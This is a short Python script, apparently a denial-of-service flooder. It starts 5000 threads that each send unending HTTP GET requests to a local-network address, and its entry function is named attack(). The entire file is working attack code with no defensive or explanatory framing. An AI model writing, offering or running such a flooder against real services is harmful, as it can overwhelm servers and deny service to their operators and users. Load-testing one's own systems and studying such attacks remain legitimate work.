import requests
from threading import Thread

THREADS = 5000
ENDPOINT = "http://192.168.1.4:8000"

def send_requests():
    while True:
        requests.get(ENDPOINT)

def attack():

    threads = []

    for _ in range(THREADS):
        threads.append(
            Thread(target=send_requests)
        )
        threads[-1].start()
    
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    attack()
